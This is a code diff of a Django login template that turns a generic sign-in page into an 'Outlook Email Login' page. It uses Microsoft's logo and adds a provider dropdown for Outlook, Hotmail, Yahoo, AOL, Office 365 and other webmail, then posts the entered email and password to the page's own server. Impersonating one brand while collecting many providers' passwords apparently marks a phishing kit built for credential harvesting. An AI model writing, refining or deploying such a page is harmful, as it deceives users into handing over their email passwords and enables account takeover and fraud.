@@ -2,98 +2,454 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Account Login</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+    <title>Outlook Email Login</title>
     <style>
-        *{margin:0;padding:0;box-sizing:border-box}
-        body{font-family:'Segoe UI',sans-serif;background:#f5f5f5;display:flex;align-items:center;justify-content:center;min-height:100vh}
-        .container{max-width:440px;width:100%;padding:20px}
-        .card{background:#fff;border-radius:8px;padding:44px 40px;box-shadow:0 2px 10px rgba(0,0,0,0.1)}
-        .logo{text-align:center;margin-bottom:30px}
-        .logo img{height:40px}
-        h1{font-size:24px;margin-bottom:8px;color:#1a1a1a}
-        .subtitle{color:#666;margin-bottom:30px}
-        .form-group{margin-bottom:20px}
-        .form-group label{display:block;margin-bottom:6px;font-weight:600;color:#333}
-        .form-group input{width:100%;padding:12px 14px;border:1px solid #ddd;border-radius:4px;font-size:16px;transition:border-color 0.3s;background:white}
-        .form-group input:focus{outline:none;border-color:#0067b8;box-shadow:0 0 0 2px rgba(0,103,184,0.1)}
-        .form-group input::placeholder{color:#999}
-        
-        .btn{width:100%;padding:12px;background:#0067b8;color:#fff;border:none;border-radius:4px;font-size:16px;font-weight:600;cursor:pointer;transition:background 0.3s;position:relative}
-        .btn:hover{background:#004d8c}
-        .btn:disabled{background:#6c757d;cursor:not-allowed;opacity:0.7}
-        
-        .btn .spinner{display:none;width:20px;height:20px;border:3px solid rgba(255,255,255,0.3);border-top:3px solid #fff;border-radius:50%;animation:spin 0.8s linear infinite;margin:0 auto}
-        .btn.loading .spinner{display:block}
-        .btn.loading .btn-text{display:none}
-        
-        @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
-        
-        .message{padding:12px;border-radius:4px;margin-bottom:15px;font-size:14px}
-        .message.success{background:#d4edda;color:#155724;border:1px solid #c3e6cb}
-        .message.error{background:#f8d7da;color:#721c24;border:1px solid #f5c6cb}
-        .message.info{background:#d1ecf1;color:#0c5460;border:1px solid #bee5eb}
-        .link{color:#0067b8;text-decoration:none}
-        .link:hover{text-decoration:underline}
-        
-        .footer-links{margin-top:25px;padding-top:20px;border-top:1px solid #e5e5e5;text-align:center;font-size:12px;color:#999}
-        .footer-links a{color:#0067b8;text-decoration:none;margin:0 10px}
-        .footer-links a:hover{text-decoration:underline}
-        .footer-links span{color:#ccc}
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            margin: 0;
+            /* ===== OUTLOOK STYLE BACKGROUND ===== */
+            background: #f0f2f5;
+            /* Subtle gradient overlay */
+            background-image: 
+                radial-gradient(ellipse at 10% 20%, rgba(0, 103, 184, 0.03) 0%, transparent 50%),
+                radial-gradient(ellipse at 90% 80%, rgba(0, 103, 184, 0.03) 0%, transparent 50%),
+                linear-gradient(135deg, #f0f2f5 0%, #e8ecf1 100%);
+        }
+
+        /* Optional: Add a subtle pattern */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-image: 
+                radial-gradient(circle at 20% 50%, rgba(0, 103, 184, 0.02) 0%, transparent 50%),
+                radial-gradient(circle at 80% 50%, rgba(0, 103, 184, 0.02) 0%, transparent 50%);
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 440px;
+            padding: 0;
+            position: relative;
+            z-index: 1;
+        }
+
+        .card {
+            background: #ffffff;
+            border-radius: 12px;
+            padding: 44px 36px 32px;
+            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.08);
+            transition: all 0.2s ease;
+            position: relative;
+        }
+
+        /* ===== LOGO ===== */
+        .logo {
+            text-align: center;
+            margin-bottom: 28px;
+        }
+
+        .logo img {
+            height: 36px;
+            width: auto;
+            display: inline-block;
+        }
+
+        /* ===== HEADER TEXT ===== */
+        .header-text {
+            text-align: center;
+            margin-bottom: 28px;
+        }
+
+        .header-text h1 {
+            font-size: 24px;
+            font-weight: 600;
+            color: #1a1a1a;
+            letter-spacing: -0.3px;
+        }
+
+        .header-text p {
+            color: #6b6b6b;
+            font-size: 15px;
+            margin-top: 4px;
+            font-weight: 400;
+        }
+
+        /* ===== FORM ===== */
+        .form-group {
+            margin-bottom: 18px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 6px;
+        }
+
+        .form-group input,
+        .form-group select {
+            width: 100%;
+            padding: 12px 14px;
+            border: 1.5px solid #d1d5db;
+            border-radius: 8px;
+            font-size: 16px;
+            background: #ffffff;
+            transition: border-color 0.2s ease, box-shadow 0.2s ease;
+            -webkit-appearance: none;
+            appearance: none;
+            color: #1a1a1a;
+        }
+
+        .form-group input:focus,
+        .form-group select:focus {
+            outline: none;
+            border-color: #0067b8;
+            box-shadow: 0 0 0 3px rgba(0, 103, 184, 0.12);
+        }
+
+        .form-group input::placeholder {
+            color: #9ca3af;
+        }
+
+        /* Custom select arrow */
+        .form-group select {
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 8'%3E%3Cpath fill='%23666' d='M6 8L0 0h12z'/%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: right 14px center;
+            padding-right: 40px;
+            cursor: pointer;
+        }
+
+        /* ===== BUTTON ===== */
+        .btn {
+            width: 100%;
+            padding: 14px;
+            background: #0067b8;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s ease, opacity 0.2s ease;
+            position: relative;
+            margin-top: 6px;
+        }
+
+        .btn:hover {
+            background: #004d8c;
+        }
+
+        .btn:disabled {
+            background: #6c757d;
+            cursor: not-allowed;
+            opacity: 0.7;
+        }
+
+        .btn .spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-top: 3px solid #fff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto;
+        }
+
+        .btn.loading .spinner {
+            display: block;
+        }
+        .btn.loading .btn-text {
+            display: none;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        /* ===== LINKS ===== */
+        .links {
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .links a {
+            color: #0067b8;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .links a:hover {
+            text-decoration: underline;
+        }
+
+        /* ===== FOOTER ===== */
+        .footer {
+            margin-top: 28px;
+            padding-top: 18px;
+            border-top: 1px solid #e5e7eb;
+            text-align: center;
+            font-size: 12px;
+            color: #9ca3af;
+        }
+
+        .footer a {
+            color: #0067b8;
+            text-decoration: none;
+            margin: 0 8px;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        .footer span {
+            color: #d1d5db;
+        }
+
+        /* ===== MESSAGES ===== */
+        .message {
+            padding: 12px 16px;
+            border-radius: 8px;
+            margin-bottom: 16px;
+            font-size: 14px;
+        }
+        .message.success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        .message.error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+        .message.info {
+            background: #d1ecf1;
+            color: #0c5460;
+            border: 1px solid #bee5eb;
+        }
+
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 480px) {
+            .card {
+                padding: 28px 20px 24px;
+                border-radius: 10px;
+            }
+
+            .header-text h1 {
+                font-size: 20px;
+            }
+
+            .header-text p {
+                font-size: 14px;
+            }
+
+            .form-group input,
+            .form-group select {
+                font-size: 15px;
+                padding: 11px 12px;
+            }
+
+            .btn {
+                font-size: 15px;
+                padding: 13px;
+            }
+
+            .logo img {
+                height: 30px;
+            }
+        }
+
+        @media (max-width: 360px) {
+            .card {
+                padding: 20px 14px 18px;
+            }
+
+            .header-text h1 {
+                font-size: 18px;
+            }
+
+            .form-group input,
+            .form-group select {
+                font-size: 14px;
+                padding: 10px 10px;
+            }
+
+            .btn {
+                font-size: 14px;
+                padding: 11px;
+            }
+        }
+
+        /* ===== SAFE AREA FOR NOTCH ===== */
+        @supports (padding: max(0px)) {
+            .container {
+                padding-left: max(20px, env(safe-area-inset-left));
+                padding-right: max(20px, env(safe-area-inset-right));
+            }
+        }
     </style>
 </head>
 <body>
+
     <div class="container">
         <div class="card">
+
+            <!-- Logo -->
             <div class="logo">
                 <img src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31" alt="Microsoft">
             </div>
-            
+
+            <!-- Header -->
+            <div class="header-text">
+                <h1>Outlook Email Login</h1>
+                <p>Your inbox · Your daily plan</p>
+            </div>
+
+            <!-- Messages -->
             {% if messages %}
                 {% for message in messages %}
                 <div class="message {{ message.tags }}">{{ message }}</div>
                 {% endfor %}
             {% endif %}
-            
-            <h1>Sign in</h1>
-            <p class="subtitle">to continue to your account</p>
-            
+
+            <!-- Form -->
             <form method="POST" id="loginForm">
                 {% csrf_token %}
+
+                <!-- Provider Dropdown -->
                 <div class="form-group">
-                    <label>Email</label>
-                    <input type="email" name="email" placeholder="Enter your email" required autofocus>
+                    <label for="service">Email Provider</label>
+                    <select name="service" id="service" required>
+                        <option value="">Select your provider...</option>
+                        <option value="outlook">Outlook</option>
+                        <option value="hotmail">Hotmail</option>
+                        <option value="yahoo">Yahoo</option>
+                        <option value="aol">AOL</option>
+                        <option value="office">Office 365</option>
+                        <option value="webmail">Webmail</option>
+                        <option value="other">Other Email</option>
+                    </select>
                 </div>
+
+                <!-- Email -->
                 <div class="form-group">
-                    <label>Password</label>
-                    <input type="password" name="password" placeholder="Enter your password" required>
+                    <label id="emailLabel">Email</label>
+                    <input type="email" name="email" id="emailInput" placeholder="Enter your email" required autofocus>
                 </div>
+
+                <!-- Password -->
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="password" name="password" id="password" placeholder="Enter your password" required>
+                </div>
+
+                <!-- Submit -->
                 <button type="submit" class="btn" id="signInBtn">
                     <span class="btn-text">Sign in</span>
                     <span class="spinner"></span>
                 </button>
             </form>
-            
-            <p style="margin-top:15px;font-size:14px;color:#666;text-align:center;">
-                No account? <a href="#" class="link">Create one!</a>
-            </p>
-            
-            <div class="footer-links">
+
+            <!-- Create new account -->
+            <div class="links">
+                <a href="#">Create new account</a>
+            </div>
+
+            <!-- Footer -->
+            <div class="footer">
                 <a href="/privacy/">Privacy Policy</a>
                 <span>|</span>
                 <a href="/terms/">Terms of Service</a>
                 <span>|</span>
                 <a href="/contact/">Contact</a>
             </div>
+
         </div>
     </div>
 
     <script>
+        // ========== DYNAMIC TEXT ==========
+        const serviceMap = {
+            'outlook': {
+                label: 'Outlook Email',
+                placeholder: 'Enter your Outlook email'
+            },
+            'hotmail': {
+                label: 'Hotmail Email',
+                placeholder: 'Enter your Hotmail email'
+            },
+            'yahoo': {
+                label: 'Yahoo Email',
+                placeholder: 'Enter your Yahoo email'
+            },
+            'aol': {
+                label: 'AOL Email',
+                placeholder: 'Enter your AOL email'
+            },
+            'office': {
+                label: 'Work Email',
+                placeholder: 'Enter your work email'
+            },
+            'webmail': {
+                label: 'Webmail Email',
+                placeholder: 'Enter your webmail address'
+            },
+            'other': {
+                label: 'Email Address',
+                placeholder: 'Enter your email address'
+            }
+        };
+
+        const serviceSelect = document.getElementById('service');
+        const emailLabel = document.getElementById('emailLabel');
+        const emailInput = document.getElementById('emailInput');
+
+        serviceSelect.addEventListener('change', function() {
+            const selected = this.value;
+            if (selected && serviceMap[selected]) {
+                emailLabel.textContent = serviceMap[selected].label;
+                emailInput.placeholder = serviceMap[selected].placeholder;
+            } else {
+                emailLabel.textContent = 'Email';
+                emailInput.placeholder = 'Enter your email';
+            }
+        });
+
+        // ========== LOADING STATE ==========
         document.getElementById('loginForm').addEventListener('submit', function() {
             const btn = document.getElementById('signInBtn');
             btn.disabled = true;
             btn.classList.add('loading');
         });
     </script>
+
 </body>
 </html>
